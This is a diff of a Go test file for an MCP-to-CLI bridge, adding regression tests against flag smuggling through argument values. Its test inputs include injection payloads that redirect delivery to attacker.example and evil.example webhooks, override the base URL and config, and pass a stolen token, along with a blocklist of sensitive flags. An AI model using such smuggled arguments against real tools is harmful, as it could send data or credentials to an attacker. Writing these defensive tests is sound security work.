@@ -98,7 +98,7 @@ func TestCliArgsFromMCP_BlocksRootFlags(t *testing.T) {
 		"receipt-file": true,
 		"token":        true,
 	})
-	want := []string{"--limit", "10"}
+	want := []string{"--limit=10"}
 	if !reflect.DeepEqual(got, want) {
 		t.Fatalf("cliArgsFromMCP dropped/kept wrong keys: got %v, want %v", got, want)
 	}
@@ -127,9 +127,60 @@ func TestCliArgsFromMCP_AllowsPerCommandFlags(t *testing.T) {
 		"tags":    []any{"a", "b"},
 	}
 	got := cliArgsFromMCP(in, map[string]bool{"args": true})
-	want := []string{"--limit", "25", "--query", "alpha", "--tags", "a,b", "--verbose"}
+	want := []string{"--limit=25", "--query=alpha", "--tags=a,b", "--verbose"}
 	if !reflect.DeepEqual(got, want) {
 		t.Fatalf("cliArgsFromMCP per-command passthrough: got %v, want %v", got, want)
+	}
+}
+
+// TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag pins the joined
+// --key=value argv shape. A Cobra bool flag does not consume the next
+// token, so emitting `--json` and a value that starts with `--` as two
+// argv elements lets pflag parse the value as a second flag the key-only
+// blocklist never inspected.
+func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(t *testing.T) {
+	payload := "--deliver=webhook:https://attacker.example/"
+	blocked := map[string]bool{
+		"args":     true,
+		"base-url": true,
+		"config":   true,
+		"deliver":  true,
+		"token":    true,
+	}
+	got := cliArgsFromMCP(map[string]any{"json": payload}, blocked)
+	want := []string{"--json=" + payload}
+	if !reflect.DeepEqual(got, want) {
+		t.Fatalf("joined argv = %#v, want %#v", got, want)
+	}
+	assertNoBlockedFlagToken(t, got, blocked)
+
+	splitArgv := []string{"--json", payload}
+	if gotDeliver := smuggleProbeDeliver(t, splitArgv); gotDeliver != "webhook:https://attacker.example/" {
+		t.Fatalf("split argv did not set --deliver (got %q); joined emission is load-bearing", gotDeliver)
+	}
+
+	if err := parseSmuggleProbeFlags(t, got); err == nil {
+		t.Fatal("joined smuggled bool value parsed successfully, want ParseBool error")
+	}
+	if gotDeliver := smuggleProbeDeliver(t, got); gotDeliver != "" {
+		t.Fatalf("joined argv set --deliver to %q", gotDeliver)
+	}
+
+	stringGot := cliArgsFromMCP(map[string]any{"format": payload}, blocked)
+	if !reflect.DeepEqual(stringGot, []string{"--format=" + payload}) {
+		t.Fatalf("string flag joined argv = %#v", stringGot)
+	}
+	if gotDeliver := smuggleProbeDeliver(t, stringGot); gotDeliver != "" {
+		t.Fatalf("string flag joined argv set --deliver to %q", gotDeliver)
+	}
+
+	for _, smuggled := range []string{
+		"--base-url=https://evil.example/",
+		"--config=/tmp/evil.yaml",
+		"--token=stolen-token",
+	} {
+		argv := cliArgsFromMCP(map[string]any{"json": smuggled}, blocked)
+		assertNoBlockedFlagToken(t, argv, blocked)
 	}
 }
 
@@ -192,7 +243,7 @@ func TestBlockedStructuredArgsOnlyDropsInheritedRootFlags(t *testing.T) {
 		"json":    "true",
 		"output":  "/tmp/evil.json",
 	}, blocked)
-	want := []string{"--json", "true", "--profile", "local-profile"}
+	want := []string{"--json=true", "--profile=local-profile"}
 	if !reflect.DeepEqual(got, want) {
 		t.Fatalf("cliArgsFromMCP command-aware blocklist: got %v, want %v", got, want)
 	}
@@ -410,7 +461,7 @@ func TestCLIArgsFromMCPSkipsStructuredPositionals(t *testing.T) {
 		"id":       "123",
 		"format":   "json",
 	}, blocked)
-	want := []string{"--format", "json"}
+	want := []string{"--format=json"}
 	if !reflect.DeepEqual(got, want) {
 		t.Fatalf("cliArgsFromMCP forwarded positionals as flags: got %v, want %v", got, want)
 	}
@@ -468,6 +519,9 @@ func TestPositionalVariadicNestedAngleBracketsSanitizesKey(t *testing.T) {
 	if positionals[0].InputName != "slug" {
 		t.Fatalf("expected InputName %q, got %q", "slug", positionals[0].InputName)
 	}
+	if !positionals[0].Variadic {
+		t.Fatalf("collapsed nested variadic should be Variadic: %#v", positionals[0])
+	}
 
 	tool := mcplib.NewTool("add", toolOptionsForFlags(cmd, blockedStructuredArgsForCommand(cmd), positionals)...)
 	props := tool.InputSchema.Properties
@@ -476,6 +530,41 @@ func TestPositionalVariadicNestedAngleBracketsSanitizesKey(t *testing.T) {
 	}
 	if _, ok := props["slug>"]; ok {
 		t.Fatalf("invalid schema key %q leaked into schema: %#v", "slug>", props)
+	}
+}
+
+func TestPositionalArgsFromRawArgsField(t *testing.T) {
+	cases := []struct {
+		name string
+		use  string
+		raw  string
+		want []string
+	}{
+		{"batch variadic urls", "batch [target...]", "https://a.example https://b.example", []string{"https://a.example", "https://b.example"}},
+		{"compare event ids", "compare [event-id...]", "101 202", []string{"101", "202"}},
+		{"compare calendar ids", "compare [calendar-id...]", "first second", []string{"first", "second"}},
+		{"scalar query keeps spaces", "search <query>", "two words", []string{"two words"}},
+		{"quoted variadic target", "batch [target...]", `"hello world" other`, []string{"hello world", "other"}},
+		{"collapsed nested variadic", "add <slug> [<slug>...]", "alpha beta", []string{"alpha", "beta"}},
+	}
+	for _, tc := range cases {
+		tc := tc
+		t.Run(tc.name, func(t *testing.T) {
+			cmd := &cobra.Command{Use: tc.use}
+			positionals := positionalArgsForCommand(cmd, nil)
+			got := positionalArgsFromRawArgsField(tc.raw, positionals, 0)
+			if !reflect.DeepEqual(got, tc.want) {
+				t.Fatalf("positionalArgsFromRawArgsField(%q) = %#v, want %#v (positionals=%#v)", tc.raw, got, tc.want, positionals)
+			}
+		})
+	}
+
+	cmd := &cobra.Command{Use: "compare [event-id...]"}
+	positionals := positionalArgsForCommand(cmd, nil)
+	got := positionalArgsFromRawArgsField("202 303", positionals, 1)
+	want := []string{"202", "303"}
+	if !reflect.DeepEqual(got, want) {
+		t.Fatalf("structured-first overflow = %#v, want %#v", got, want)
 	}
 }
 
@@ -594,6 +683,128 @@ func TestShellOutSinglePositionalArgsFieldPreservesWhitespace(t *testing.T) {
 	}
 	got := decodeArgvResult(t, result)
 	want := []string{"areas", "search", "New York City"}
+	if !reflect.DeepEqual(got, want) {
+		t.Fatalf("shellout argv = %#v, want %#v", got, want)
+	}
+}
+
+func TestShellOutVariadicRawArgsSplits(t *testing.T) {
+	bin := writeArgvHelper(t)
+	cases := []struct {
+		name        string
+		use         string
+		commandPath []string
+		raw         string
+		want        []string
+	}{
+		{
+			name:        "batch targets",
+			use:         "batch [target...]",
+			commandPath: []string{"batch"},
+			raw:         "https://a.example https://b.example",
+			want:        []string{"batch", "https://a.example", "https://b.example"},
+		},
+		{
+			name:        "compare event ids",
+			use:         "compare [event-id...]",
+			commandPath: []string{"compare"},
+			raw:         "101 202",
+			want:        []string{"compare", "101", "202"},
+		},
+		{
+			name:        "compare calendar ids",
+			use:         "compare [calendar-id...]",
+			commandPath: []string{"compare"},
+			raw:         "first second",
+			want:        []string{"compare", "first", "second"},
+		},
+		{
+			name:        "quoted whitespace stays inside a target",
+			use:         "batch [target...]",
+			commandPath: []string{"batch"},
+			raw:         `"hello world" other`,
+			want:        []string{"batch", "hello world", "other"},
+		},
+	}
+	for _, tc := range cases {
+		tc := tc
+		t.Run(tc.name, func(t *testing.T) {
+			cmd := &cobra.Command{Use: tc.use}
+			positionals := positionalArgsForCommand(cmd, nil)
+			handler := shellOutToCLI(
+				func() (string, error) { return bin, nil },
+				tc.commandPath,
+				map[string]bool{"args": true},
+				map[string]bool{"args": true},
+				positionals,
+				false,
+				nil,
+			)
+			result, err := handler(context.Background(), mcplib.CallToolRequest{Params: mcplib.CallToolParams{
+				Arguments: map[string]any{"args": tc.raw},
+			}})
+			if err != nil {
+				t.Fatalf("handler returned transport error: %v", err)
+			}
+			if result.IsError {
+				t.Fatalf("handler returned tool error: %s", toolResultText(result))
+			}
+			got := decodeArgvResult(t, result)
+			if !reflect.DeepEqual(got, tc.want) {
+				t.Fatalf("shellout argv = %#v, want %#v", got, tc.want)
+			}
+		})
+	}
+
+	cmd := &cobra.Command{Use: "batch [target...]"}
+	positionals := positionalArgsForCommand(cmd, nil)
+	handler := shellOutToCLI(
+		func() (string, error) { return bin, nil },
+		[]string{"batch"},
+		map[string]bool{"args": true},
+		map[string]bool{"args": true},
+		positionals,
+		false,
+		nil,
+	)
+	result, err := handler(context.Background(), mcplib.CallToolRequest{Params: mcplib.CallToolParams{
+		Arguments: map[string]any{"args": "ok --deliver=webhook:https://evil.example/"},
+	}})
+	if err != nil {
+		t.Fatalf("handler returned transport error: %v", err)
+	}
+	if !result.IsError {
+		t.Fatalf("handler accepted flag-like raw args, result=%s", toolResultText(result))
+	}
+	if got := toolResultText(result); !strings.Contains(got, "flag-like argument") {
+		t.Fatalf("tool error = %q, want flag-like argument rejection", got)
+	}
+}
+
+func TestShellOutStructuredThenRawOverflowPreservesOrder(t *testing.T) {
+	bin := writeArgvHelper(t)
+	cmd := &cobra.Command{Use: "compare [event-id...]"}
+	positionals := positionalArgsForCommand(cmd, nil)
+	handler := shellOutToCLI(
+		func() (string, error) { return bin, nil },
+		[]string{"compare"},
+		map[string]bool{"args": true, "event-id": true},
+		map[string]bool{"args": true, "event-id": true},
+		positionals,
+		false,
+		nil,
+	)
+	result, err := handler(context.Background(), mcplib.CallToolRequest{Params: mcplib.CallToolParams{
+		Arguments: map[string]any{"event-id": "101", "args": "202 303"},
+	}})
+	if err != nil {
+		t.Fatalf("handler returned transport error: %v", err)
+	}
+	if result.IsError {
+		t.Fatalf("handler returned tool error: %s", toolResultText(result))
+	}
+	got := decodeArgvResult(t, result)
+	want := []string{"compare", "101", "202", "303"}
 	if !reflect.DeepEqual(got, want) {
 		t.Fatalf("shellout argv = %#v, want %#v", got, want)
 	}
@@ -876,6 +1087,44 @@ func writeShelloutHelper(t *testing.T, mode string) string {
 		t.Fatalf("write helper: %v", err)
 	}
 	return path
+}
+
+func newSmuggleProbeCommand() (*cobra.Command, *string) {
+	var deliver string
+	cmd := &cobra.Command{Use: "root"}
+	cmd.Flags().Bool("json", false, "")
+	cmd.Flags().String("format", "", "")
+	cmd.Flags().StringVar(&deliver, "deliver", "", "")
+	cmd.Flags().String("base-url", "", "")
+	cmd.Flags().String("config", "", "")
+	cmd.Flags().String("token", "", "")
+	return cmd, &deliver
+}
+
+func parseSmuggleProbeFlags(t *testing.T, args []string) error {
+	t.Helper()
+	cmd, _ := newSmuggleProbeCommand()
+	return cmd.ParseFlags(append([]string{}, args...))
+}
+
+func smuggleProbeDeliver(t *testing.T, args []string) string {
+	t.Helper()
+	cmd, deliver := newSmuggleProbeCommand()
+	_ = cmd.ParseFlags(append([]string{}, args...))
+	return *deliver
+}
+
+func assertNoBlockedFlagToken(t *testing.T, argv []string, blocked map[string]bool) {
+	t.Helper()
+	for _, tok := range argv {
+		name := strings.TrimPrefix(tok, "--")
+		if i := strings.IndexByte(name, '='); i >= 0 {
+			name = name[:i]
+		}
+		if blocked[name] {
+			t.Errorf("blocked flag %q leaked as argv token %q", name, tok)
+		}
+	}
 }
 
 func writeArgvHelper(t *testing.T) string {
